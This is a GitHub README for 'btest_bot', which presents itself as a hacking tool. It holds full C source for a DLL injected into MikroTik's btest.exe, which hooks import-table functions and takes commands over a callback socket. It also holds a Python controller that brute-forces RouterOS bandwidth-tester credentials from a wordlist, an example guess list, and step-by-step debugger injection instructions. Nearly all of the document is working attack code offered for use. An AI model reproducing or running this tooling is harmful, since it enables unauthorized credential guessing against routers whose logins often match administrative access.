# btest_bot
Automate MikroTik btest.exe to be used as a hacking tool

Demonstrates a DLL that can be injected into btest.exe and controlled through a script to brute force credentials for the bandwidth tester service running on port 2000 of MikroTik RouterOS.  When authentication is enabled on the bandwidth tester service the credentials needed are usually the same as those needed to log into the WebFig UI or the CLI via SSH.

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/btestbot.gif)

A copy of btest.exe that was used in this example can be [downloaded here](https://download.mikrotik.com/routeros/7.23.1/btest.exe) or [here](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/btest.exe.zip)

MD5 hashes:<br />

```
btest.exe = 48d9d1c7e994407a936f37585a15958d
btest.exe.zip = e6087c97d3dfa1197c7bd3425ec8d596
```

The C source code for the DLL `btestbot.c`:<br />

```c
/*
   compile: i686-w64-mingw32-gcc -s -m32 -Wl,--kill-at -shared -o btestbot.dll btestbot.c -lws2_32 -lkernel32

   Minimal input and bounds checks performed; assumes you will be controlling the bot and sending only valid strings.

   The btest.exe application is a fixed sized GUI that does not have resize handles.  The control coordinates used
   in this module should work but if you run into problems debug hints are provided so you can find the pt and rect
   structures in your specific case.

   Also a bug was dicovered in btest.exe which oversubscribes RegisterWindowMessageA by calling it unnecessarily
   during every click of the Start button, which results in application and desktop instability.  The IAT for 
   RegisterWindowMessageA is intercepted by this module returning a message ID from the WM_APP pool instead.

   How to use:
   (1) preconfigure the following btest settings that are not controlled through the bot.
       these are usually saved and automatically reload at launch from "%USERPROFILE%\AppData\Roaming\Mikrotik\winbtest\"
       (a) Protocol: tcp
       (b) Local Tx Size: 1000
       (c) Remote Tx Size: 1000
       (d) Direction: receive
       (e) Local Tx Speed: 10.0 Kbps
       (f) Remote Tx Speed: 10.0 Kbps
       (g) Connection Count: 1
   (2) compile the DLL using your own IP address and port, then copy it to your Windows system that has btest.exe installed.
   (3) launch btest.exe in a debugger like x32dbg.  btest.exe is a 32-bit program so use a 32-bit debugger.
   (4) from the debugger import the btestbot.dll module.
   (5) remove breakpoints set by the debugger and run btest.exe, minimize the debugger, then bring btest to the foreground and ensure the "Client" tab is selected.
   (6) start your listener on the bot script host, e.g. "nc -nlvp 9999", or btest_automate.py to perform credential brute forcing.
   (7) control btest.exe from your listener by sending commands:
       (a) init - must be the first command sent to initialize the bot.
       (b) bye - will close the connection between the bot and the script host listener.  btestbot will attempt to reconnect.
       (c) kill - terminates the btest.exe process.
       (d) setip a.b.c.d - sets the Address string.
       (e) setuser some_username - sets the User string.
       (f) setpass some_password - sets the Password string.
       (g) start - starts the btest client auth exchange and bandwidth test.
       (h) stop - cancels a "running..." bandwidth test.
       (i) status - returns the current text from the status field:
           > "running..." indicates either authentication was successful, or anonymous connections are allowed if every username/password combo returns this.
             this is the only status that indicates a valid user name and password was provided.
             send a stop command to cancel the running state before continuing with subsequent commands.
           > "done" this is the halt state when the stop command is sent.
           > "connecting..." occurs after a start command and indicates the application is trying to connect to the server.
             do not send a stop command during this phase, it could crash the application.  wait for a halt state.
           > "failed to connect" this is a halt state that indicates invalid credentials were supplied or there was a connection error.
           > "auth. failed" this is a halt state indicating that invalid credentials were provided on legacy RouterOS btest server versions.
           > other unhandled statuses that were not observed during testing:
             "cann't start test" (yes, the string compiled in btest.exe has a typo)
             "remote peer is busy"
             "test unsupported"
             "disconnected"
*/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef int (WINAPI *p_DrawTextExA)(HDC, LPSTR, int, LPRECT, UINT, LPDRAWTEXTPARAMS); // needed to intercept the string before pixels drawn to HDC
typedef UINT (WINAPI *p_RegisterWindowMessageA)(LPCSTR); // patch against 0xC000-0xFFFF msg ID leak

#define REMOTE_IP "192.168.1.149" // address of bot script host
#define REMOTE_PORT 9999 // port of bot script host
#define BUFSIZE 2048

BOOL init = FALSE;
HWND hWnd = NULL;
p_DrawTextExA pOriginalDrawTextExA = NULL;
p_RegisterWindowMessageA pOriginalRegisterWindowMessageA = NULL;
int textlen = 0;
char status[BUFSIZE] = {0};
LPARAM lParam;
UINT wmsg = 0x8000;

void SendSelectAll()
{
    INPUT input[4];
    ZeroMemory(input, sizeof(input));

    // press Ctrl
    input[0].type = INPUT_KEYBOARD;
    input[0].ki.wVk = VK_CONTROL;

    // press 'A'
    input[1].type = INPUT_KEYBOARD;
    input[1].ki.wVk = 0x41;

    // release 'A'
    input[2].type = INPUT_KEYBOARD;
    input[2].ki.wVk = 0x41;
    input[2].ki.dwFlags = KEYEVENTF_KEYUP;

    // release Ctrl
    input[3].type = INPUT_KEYBOARD;
    input[3].ki.wVk = VK_CONTROL;
    input[3].ki.dwFlags = KEYEVENTF_KEYUP;

    // Send the input sequence to the active window
    SendInput(4, input, sizeof(INPUT));
}

BOOL SendString(const char *str)
{
    int len = strlen(str);

    INPUT *inputs = calloc(len * 2, sizeof(INPUT));
    if (!inputs) return FALSE;

    for (int i = 0; i < len; i++)
    {
        // key Down
        inputs[i * 2].type = INPUT_KEYBOARD;
        inputs[i * 2].ki.wVk = 0;
        inputs[i * 2].ki.wScan = (WORD)str[i];
        inputs[i * 2].ki.dwFlags = KEYEVENTF_UNICODE;
        inputs[i * 2].ki.time = 0;
        inputs[i * 2].ki.dwExtraInfo = 0;

        // key Up
        inputs[i * 2 + 1].type = INPUT_KEYBOARD;
        inputs[i * 2 + 1].ki.wVk = 0;
        inputs[i * 2 + 1].ki.wScan = (WORD)str[i];
        inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        inputs[i * 2 + 1].ki.time = 0;
        inputs[i * 2 + 1].ki.dwExtraInfo = 0;
    }

    // send text to the foreground application
    UINT uSent = SendInput(len * 2, inputs, sizeof(INPUT));
    free(inputs);

    return TRUE;
}

void GetUI(HWND hWnd)
{
    if (GetForegroundWindow() != hWnd)
    {
        if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
        SetForegroundWindow(hWnd);
    }
}

int WINAPI HookedDrawTextExA(HDC hdc, LPSTR lpchText, int cchText, LPRECT lprc, UINT format, LPDRAWTEXTPARAMS lpdtp)
{
    // status area rectangle determined from breakpoint on DrawTextExA
    if (lprc->left == 284 && lprc->top == 394 && lprc->right == 561 && lprc->bottom == 16778)
    {
        textlen = cchText;
        if (textlen > 1000) textlen = 1000;
        for (int i = 0; i < textlen; i++)
        {
            status[i] = *(lpchText + i);
            status[i + 1] = 0;
        }
    }
    // call the original function
    return pOriginalDrawTextExA(hdc, lpchText, cchText, lprc, format, lpdtp);
}

UINT WINAPI HookedRegisterWindowMessageA(LPCSTR lpString)
{
    // RegisterWindowMessageA should only be called once at the beginning of the program when shared messages across applications are needed.
    // btest.exe, however, calls RegisterWindowMessageA on every Start button click, which depletes OS msg ID space, resulting in application
    // crashes.  The "SockMsg#" IDs needed can be issued as private message IDs by round-robin from the WM_APP range (0x8000-0xBFFF).
    wmsg++;
    if (wmsg > 0xbfff) wmsg = 0x8000;

    return wmsg;
}

BOOL ReplaceIAT1()
{
    // replace the entry point to DrawTextExA
    BOOL replaced = FALSE;

    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (hUser32 != NULL)
    {
        p_DrawTextExA pDrawTextExA = (p_DrawTextExA)GetProcAddress(hUser32, "DrawTextExA");
        if (pDrawTextExA != NULL)
        {
            pOriginalDrawTextExA = pDrawTextExA;
            HMODULE hModules = GetModuleHandleA(NULL);
            if (hModules)
            {
                PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModules;
                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModules + pDosHeader->e_lfanew);
                IMAGE_DATA_DIRECTORY importDirectory = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
                if (importDirectory.Size != 0)
                {
                    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModules + importDirectory.VirtualAddress);
                    while (pImportDesc->Name)
                    {
                        char* currentDllName = (char*)((BYTE*)hModules + pImportDesc->Name);
                        if (_stricmp(currentDllName, "user32.dll") == 0)
                        {
                            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModules + pImportDesc->OriginalFirstThunk);
                            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModules + pImportDesc->FirstThunk);
                            while (pOriginalFirstThunk->u1.AddressOfData)
                            {
                                if (!(pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG))
                                {
                                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModules + pOriginalFirstThunk->u1.AddressOfData);
                                    if (strcmp((char*)pImportByName->Name, "DrawTextExA") == 0)
                                    {
                                        DWORD oldProtect;
                                        if (VirtualProtect(&pFirstThunk->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect))
                                        {
                                            PROC origFunc = (PROC)pFirstThunk->u1.Function;
                                            pFirstThunk->u1.Function = (DWORD_PTR)((PROC)HookedDrawTextExA);
                                            VirtualProtect(&pFirstThunk->u1.Function, sizeof(DWORD_PTR), oldProtect, &oldProtect);
                                            replaced = TRUE;
                                        }
                                    }
                                }
                                pOriginalFirstThunk++;
                                pFirstThunk++;
                            }
                        }
                        pImportDesc++;
                    }
                }
                else
                {
                    return replaced;
                }
            }
            else
            {
                return replaced;
            }
        }
        else
        {
            return replaced;
        }
    }
    else
    {
        return replaced;
    }

    return replaced;
}

BOOL ReplaceIAT2()
{
    // replace the entry point to RegisterWindowMessageA
    BOOL replaced = FALSE;

    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (hUser32 != NULL)
    {
        p_RegisterWindowMessageA pRegisterWindowMessageA = (p_RegisterWindowMessageA)GetProcAddress(hUser32, "RegisterWindowMessageA");
        if (pRegisterWindowMessageA != NULL)
        {
            pOriginalRegisterWindowMessageA = pRegisterWindowMessageA;
            HMODULE hModules = GetModuleHandleA(NULL);
            if (hModules)
            {
                PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModules;
                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModules + pDosHeader->e_lfanew);
                IMAGE_DATA_DIRECTORY importDirectory = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
                if (importDirectory.Size != 0)
                {
                    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModules + importDirectory.VirtualAddress);
                    while (pImportDesc->Name)
                    {
                        char* currentDllName = (char*)((BYTE*)hModules + pImportDesc->Name);
                        if (_stricmp(currentDllName, "user32.dll") == 0)
                        {
                            PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModules + pImportDesc->OriginalFirstThunk);
                            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModules + pImportDesc->FirstThunk);
                            while (pOriginalFirstThunk->u1.AddressOfData)
                            {
                                if (!(pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG))
                                {
                                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModules + pOriginalFirstThunk->u1.AddressOfData);
                                    if (strcmp((char*)pImportByName->Name, "RegisterWindowMessageA") == 0)
                                    {
                                        DWORD oldProtect;
                                        if (VirtualProtect(&pFirstThunk->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect))
                                        {
                                            PROC origFunc = (PROC)pFirstThunk->u1.Function;
                                            pFirstThunk->u1.Function = (DWORD_PTR)((PROC)HookedRegisterWindowMessageA);
                                            VirtualProtect(&pFirstThunk->u1.Function, sizeof(DWORD_PTR), oldProtect, &oldProtect);
                                            replaced = TRUE;
                                        }
                                    }
                                }
                                pOriginalFirstThunk++;
                                pFirstThunk++;
                            }
                        }
                        pImportDesc++;
                    }
                }
                else
                {
                    return replaced;
                }
            }
            else
            {
                return replaced;
            }
        }
        else
        {
            return replaced;
        }
    }
    else
    {
        return replaced;
    }

    return replaced;
}

DWORD WINAPI BotHandler(LPVOID lpParam)
{
    // create socket and process the commands
    WSADATA wsaData;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    char buffer[BUFSIZE];
    char data[BUFSIZE];
    char mesg[BUFSIZE];
    int bytesReceived;

    // initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    hWnd = FindWindowW(NULL, L"MikroTik BandWidth Test v0.1");

    while(1)
    {
        // create TCP socket
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET)
        {
            Sleep(1000);
        }
        else
        {
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_addr.s_addr = inet_addr(REMOTE_IP);
            serverAddr.sin_port = htons(REMOTE_PORT);
            // connect to scripting host
            if (connect(clientSocket, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
            {
                closesocket(clientSocket);
                Sleep(1000);
            }
            /*
               command loop:

               init - must be the first command called to initialize the bot
               bye - disconnects the bot from the scripting host, will attempt reconnect
               kill - terminates the btest.exe process
               setuser - followed by space and a username, sets the user field
               setpass - followed by space and a password, sets the password field
               setip - followed by space and an IPv4 address, sets the address field
               start - clicks the start button
               stop - clicks the stop button
               status - gets the status field text message
            */
            while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0)
            {
                buffer[bytesReceived] = '\0';
                buffer[strcspn(buffer, "\r\n")] = '\0';
                if (!strcmp(buffer, "init")) // bring GUI to the foreground and hook DrawTextExA
                {
                    if (init == FALSE)
                    {
                        hWnd = FindWindowW(NULL, L"MikroTik BandWidth Test v0.1");
                        if (!hWnd)
                        {
                            sprintf(mesg, "bot initialization failed [FindWindowW].\n");
                            send(clientSocket, mesg, strlen(mesg), 0);
                        }
                        else
                        {
                            GetUI(hWnd);
                            if (ReplaceIAT1())
                            {
                                if (ReplaceIAT2())
                                {
                                    init = TRUE;
                                    sprintf(mesg, "bot initialization successful.\n");
                                    send(clientSocket, mesg, strlen(mesg), 0);
                                }
                                else
                                {
                                    sprintf(mesg, "bot initialization failed [ReplaceIAT2].\n");
                                    send(clientSocket, mesg, strlen(mesg), 0);
                                }
                            }
                            else
                            {
                                sprintf(mesg, "bot initialization failed [ReplaceIAT1].\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                        }
                    }
                    else
                    {
                        sprintf(mesg, "init has already been called.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (!strcmp(buffer, "bye")) // close socket connection
                {
                    sprintf(mesg, "closing bot socket.\n");
                    send(clientSocket, mesg, strlen(mesg), 0);
                    closesocket(clientSocket);
                    break;
                }
                if (!strcmp(buffer, "kill")) // kill the application
                {
                    sprintf(mesg, "terminating btest application.\n");
                    send(clientSocket, mesg, strlen(mesg), 0);
                    ExitProcess(1);
                    break;
                }
                if (strstr(buffer, "setuser ") == buffer) // set the username
                {
                    if (init == TRUE)
                    {
                        strcpy(data, buffer + strlen("setuser "));
                        if (strlen(data) > 0)
                        {
                            GetUI(hWnd);
                            lParam = MAKELPARAM(115, 244); // determined from breakpoint on SetCaretPos
                            SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                            SendMessage(hWnd, WM_LBUTTONUP, 0, lParam);
                            SendSelectAll();
                            if (SendString(data))
                            {
                                sprintf(mesg, "username set.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                            else
                            {
                                sprintf(mesg, "failed to set username.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                        }
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (strstr(buffer, "setpass ") == buffer) // set the password
                {
                    if (init == TRUE)
                    {
                        strcpy(data, buffer + strlen("setpass "));
                        if (strlen(data) > 0)
                        {
                            GetUI(hWnd);
                            lParam = MAKELPARAM(115, 269); // determined from breakpoint on SetCaretPos
                            SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                            SendMessage(hWnd, WM_LBUTTONUP, 0, lParam);
                            SendSelectAll();
                            if (SendString(data))
                            {
                                sprintf(mesg, "password set.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                            else
                            {
                                sprintf(mesg, "failed to set password.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                        }
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (strstr(buffer, "setip ") == buffer) // send the IP address
                {
                    if (init == TRUE)
                    {
                        strcpy(data, buffer + strlen("setip "));
                        if (strlen(data) > 0)
                        {
                            GetUI(hWnd);
                            lParam = MAKELPARAM(115, 39); // determined from breakpoint on SetCaretPos
                            SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                            SendMessage(hWnd, WM_LBUTTONUP, 0, lParam);
                            SendSelectAll();
                            if (SendString(data))
                            {
                                sprintf(mesg, "ip address set.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                            else
                            {
                                sprintf(mesg, "failed to set ip address.\n");
                                send(clientSocket, mesg, strlen(mesg), 0);
                            }
                        }
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (!strcmp(buffer, "start")) // click Start button
                {
                    if (init == TRUE)
                    {
                        GetUI(hWnd);
                        lParam = MAKELPARAM(522, 44); // determined from breakpoint on WM_LBUTTONDOWN LPARAM struct
                        SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                        SendMessage(hWnd, WM_LBUTTONUP, 0, lParam);
                        sprintf(mesg, "start button clicked.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (!strcmp(buffer, "stop")) // click Stop button
                {
                    if (init == TRUE)
                    {
                        GetUI(hWnd);
                        lParam = MAKELPARAM(522, 67); // determined from breakpoint on WM_LBUTTONDOWN LPARAM struct
                        SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
                        SendMessage(hWnd, WM_LBUTTONUP, 0, lParam);
                        sprintf(mesg, "stop button clicked.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
                if (!strcmp(buffer, "status")) // get the status text
                {
                    if (init == TRUE)
                    {
                        GetUI(hWnd);
                        sprintf(mesg, "%s\n", status);
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                    else
                    {
                        sprintf(mesg, "you must call init first.\n");
                        send(clientSocket, mesg, strlen(mesg), 0);
                    }
                }
            }
        }
    }
    // cleanup connection
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // disable thread library calls for optimization
        DisableThreadLibraryCalls(hinstDLL);
        // create the thread to run the bot command loop
        hThread = CreateThread(NULL, 0, BotHandler, NULL, 0, NULL);
        if (hThread != NULL)
        {
            CloseHandle(hThread);
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
```

A python script used to automate password guessing with the DLL `btest_automate.py`:<br />

```python
#!/usr/bin/env python3
"""
btest_automate.py

Usage:
btest_automate.py <bind_ip> <bind_port> <parameter_file>

Listens on <bind_ip>:<bind_port>, accepts a single connection

performs an "init" handshake with the btest bot and exercises the app
with credentials [ip_address username password] from <parameter_file>
"""
import select
import socket
import sys
import time

def send_line(conn, text):
    conn.sendall((text + "\n").encode("utf-8"))

def recv_line(conn):
    """
    Read a single newline-terminated line from the connection.
    Returns the line without the trailing newline, or None if the
    peer closed the connection before a newline was received.
    """
    buf = bytearray()
    while True:
        chunk = conn.recv(1)
        if not chunk:
            # connection closed
            if buf:
                return buf.decode("utf-8", errors="replace")
            return None
        if chunk == b"\n":
            # strip trailing CRLF
            if buf and buf[-1:] == b"\r":
                buf = buf[:-1]
            return buf.decode("utf-8", errors="replace")
        buf += chunk

def main():
    if len(sys.argv) != 4:
        print("usage: btest_automate.py <bind_ip> <bind_port> <parameter_file>")
        sys.exit(1)

    bind_ip = sys.argv[1]
    bind_port = int(sys.argv[2])
    param_file_path = sys.argv[3]

    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind((bind_ip, bind_port))
    listen_sock.listen(1)

    print(f"listening on {bind_ip}:{bind_port} ...")
    conn, addr = listen_sock.accept()
    print("connection received from btest bot.")
    print("*** If every credential test is SUCCESS then you are dealing with an anonymous server ***")

    try:
        # --- init handshake ---
        send_line(conn, "init")
        response = recv_line(conn)
        if response == "bot initialization successful.":
            pass
        elif response == "init has already been called.":
            pass
        else:
            print("command processor error.")
            sys.exit(1)

        # --- process parameter file ---
        with open(param_file_path, "r") as param_file:
            for raw_line in param_file:
                line = raw_line.strip()
                if not line:
                    continue

                parts = line.split(" ")
                if len(parts) != 3:
                    print(f"\nmalformed parameter line, skipping: {line}")
                    continue

                ip_address, username, password = parts
                print(".", end="", flush=True)

                # setip
                time.sleep(0.1)
                send_line(conn, f"setip {ip_address}")
                response = recv_line(conn)
                if response != "ip address set.":
                    print("\nsetip failed.")
                    sys.exit(1)

                # setuser
                time.sleep(0.1)
                send_line(conn, f"setuser {username}")
                response = recv_line(conn)
                if response != "username set.":
                    print("\nsetuser failed.")
                    sys.exit(1)

                # setpass
                time.sleep(0.1)
                send_line(conn, f"setpass {password}")
                response = recv_line(conn)
                if response != "password set.":
                    print("\nsetpass failed.")
                    sys.exit(1)

                # start
                time.sleep(0.1)
                send_line(conn, "start")
                response = recv_line(conn)
                if response != "start button clicked.":
                    print("\nstart failed.")
                    sys.exit(1)

                # status loop
                while True:
                    time.sleep(0.1)
                    send_line(conn, "status")
                    response = recv_line(conn)

                    if response == "connecting...":
                        continue
                    elif response == "running...":
                        send_line(conn, "stop")
                        print(f"\nSUCCESS: {line}")
                        response = recv_line(conn)

                        # wait for btest to finish stopping
                        while True:
                            time.sleep(0.1)
                            send_line(conn, "status")
                            stop_response = recv_line(conn)
                            if stop_response == "done":
                                break

                        break
                    else:
                        break

        print("\n\ncredential testing complete.")

    finally:
        conn.close()
        listen_sock.close()

if __name__ == "__main__":
    main()
```

Example wordlist format to be used with the python script `wordlist.txt`:<br />

```
192.168.1.58 admin btest
192.168.1.58 admin admin123!
192.168.1.58 btest password
192.168.1.58 tester 12345678
192.168.1.58 tester tester
192.168.1.58 btest test123
192.168.1.58 btest P@$$w0rd
192.168.1.58 btest pa55w0rd
192.168.1.58 admin administrator
192.168.1.58 tester bandwidth
```

Loading the DLL into btest.exe using x32dbg:<br />

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_00.png)

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_01.png)

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_02.png)

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_03.png)

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_04.png)

![alt text](https://raw.githubusercontent.com/billchaison/btest_bot/refs/heads/main/dbg_05.png)

Start the python scripting host:<br />

`./btest_automate.py 0.0.0.0 9999 wordlist.txt`
